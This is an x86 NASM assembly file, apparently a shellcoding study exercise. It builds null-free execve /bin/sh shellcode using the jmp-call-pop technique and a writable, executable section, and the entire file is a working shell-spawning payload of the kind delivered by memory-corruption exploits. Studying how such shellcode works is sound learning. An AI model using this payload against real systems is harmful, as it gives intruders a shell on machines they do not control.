; execve.nasm
; Author: Kunal varudkar
; Purpose: To understand, usage of execve and develope a shellcode for /bin/sh 


global _start
	
section .shellcode progbits alloc exec write align=16	; user defined segment, made writable as we want to write in ESI

_start:
	jmp short call_shellcode

shellcode:

	pop esi				; pop the string in ESI

	; making "/bin/shABBBBCCCCC" according to our need

	xor ebx, ebx			; avoid null in register
	
	mov byte [esi +7], bl		; moving null character to /bin/sh,0x00

	mov dword [esi +8], esi		; 1st arg of argv[], moving address of /bin/sh 

	mov dword [esi +12], ebx	; 2nd arg of argv[], moving Null 

	; modification for making syscall

	xor eax, eax			; avoid null in register

	lea ebx, [esi]			; filename - /bin/sh,0x00

	lea ecx, [esi +8]		; address of /bin/sh	
	
	lea edx, [esi +12]		; Null character

	mov al, 0xb			; syscall 

	int 0x80

	; execve if executed successfully, doesnt return anything - No exit code


call_shellcode:

	call shellcode
	message:	db	"/bin/shABBBBCCCC"
